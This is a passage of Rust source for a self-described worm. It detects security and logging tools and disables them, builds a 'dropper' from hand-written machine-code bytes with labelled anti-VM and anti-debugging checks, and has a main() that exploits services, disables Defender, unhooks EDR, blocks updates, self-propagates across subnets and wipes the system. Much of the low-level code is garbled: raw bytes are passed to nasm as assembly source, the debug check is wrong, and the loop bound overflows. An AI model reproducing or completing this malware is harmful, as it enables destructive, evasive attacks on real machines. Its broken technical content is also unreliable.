            "avast", "crowdstrike", "falcon", "fail2ban", "ufw", "iptables", 
            "firewalld", "selinux", "apparmor", "auditd", "sysdig", "osquery", 
            "sysmon", "syslog-ng", "logrotate", "logwatch", "auditbeat", 
            "filebeat", "metricbeat", "packetbeat", "heartbeat", "winlogbeat", 
            "journalbeat", "elasticsearch", "kibana", "logstash", "beats", 
            "ossec", "samhain", "aide", "tripwire", "lynis", "tiger", 
            "nessus", "openvas"
        ];

        for tool in tools {
            let output = Command::new("pgrep").arg(tool).output()?;
            if output.status.success() {
                println!("Security tool detected: {}", tool);
                self.disable_security_tools()?;
            }
        }
        Ok(())
    }

    // Function to create a dropper
    fn create_dropper(&self) -> Result<(), WormError> {
        // Raw assembly code to launch Calculator and Notepad with anti-VM and anti-debugging checks
        let asm_code: &[u8] = &[
            // Anti-VM check (simplified)
            // Check for known VM signatures (e.g., VMware, VirtualBox)
            // This is a placeholder; actual implementation would require specific checks
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, <check_vm_signature_address>
            0xFF, 0xD0,                   // call eax
            // If VM detected, exit
            0xC3,                         // ret

            // Anti-debugging check
            // Check for hardware breakpoints
            0x0F, 0x1F, 0x00,             // nop (align)
            0x0F, 0x1F, 0x40, 0x00,       // nop (align)
            0x0F, 0x1F, 0x44, 0x00, 0x00, // nop (align)
            0x0F, 0x1F, 0x48, 0x00,       // nop (align)
            // Check debug registers (DR0-DR3)
            0x8B, 0x04, 0x24,             // mov eax, [esp] (get the first debug register)
            0x85, 0xC0,                   // test eax, eax
            0x74, 0x0C,                   // jz no_debugger
            // If debugger detected, exit
            0xC3,                         // ret
            // no_debugger:
            
            // Launch Notepad
            0x68, 0x64, 0x6F, 0x63, 0x00, // "doc" (notepad.exe)
            0x68, 0x6E, 0x6F, 0x74, 0x65, // "note"
            0x68, 0x70, 0x61, 0x64, 0x00, // "pad"
            0x68, 0x65, 0x78, 0x65, 0x00, // "exe"
            
            // Call CreateProcess for Notepad
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, CreateProcess address
            0xFF, 0xD0,                   // call eax

            // Launch Calculator
            0x68, 0x63, 0x61, 0x6C, 0x63, // "calc"
            0x68, 0x61, 0x6C, 0x63, 0x00, // "cal"
            0x68, 0x65, 0x78, 0x65, 0x00, // "exe"
            
            // Call CreateProcess for Calculator
            0xB8, 0x00, 0x00, 0x00, 0x00, // mov eax, CreateProcess address
            0xFF, 0xD0,                   // call eax

            // Exit the process
            0xC3,                         // ret
        ];

        // Write the assembly code to a file
        let dropper_path = "dropper.asm";
        fs::write(dropper_path, asm_code).map_err(|e| WormError::IoError(e))?;

        // Compile the assembly code to create the dropper executable
        Command::new("nasm")
            .args(&["-f", "win64", dropper_path, "-o", "dropper.exe"])
            .status()
            .map_err(|e| WormError::IoError(e))?;

        // Run the dropper executable
        Command::new("dropper.exe")
            .status()
            .map_err(|e| WormError::IoError(io::Error::new(io::ErrorKind::Other, e).into()))?;
        Ok(())
    }
}

// Function to generate passwords of a given length using the specified character set
fn generate_passwords(charset: &str, length: usize) -> impl Iterator<Item = String> {
    let charset: Vec<char> = charset.chars().collect();
    let charset_len = charset.len();

    repeat_with(move || {
        (0..length)
            .map(|_| charset[rand::random::<usize>() % charset_len])
            .collect::<String>()
    })
    .take(1 << (length * 8)) // Limit the number of generated passwords
}

fn main() -> Result<(), WormError> {
    let config = WormConfig::new()?;
    let mut worm = AdvancedWorm::new(config);

    // Run worm functionalities
    worm.exploit()?;                  // Aggressively exploit vulnerable services
    worm.disable_defender(Some(vec![]))?;   // Disable Microsoft Defender processes and services
    worm.unhook_edr()?;               // Unhook EDR services
    worm.block_security_updates()?;   // Prevent further updates from happening
    worm.self_propagate()?;           // Network-based spreading across subnets
    worm.detect_threats();            // Call without ? if it doesn't return Result
    worm.wipe_system()?;              // Wipe system after operations are complete

    Ok(())
}                                                                          
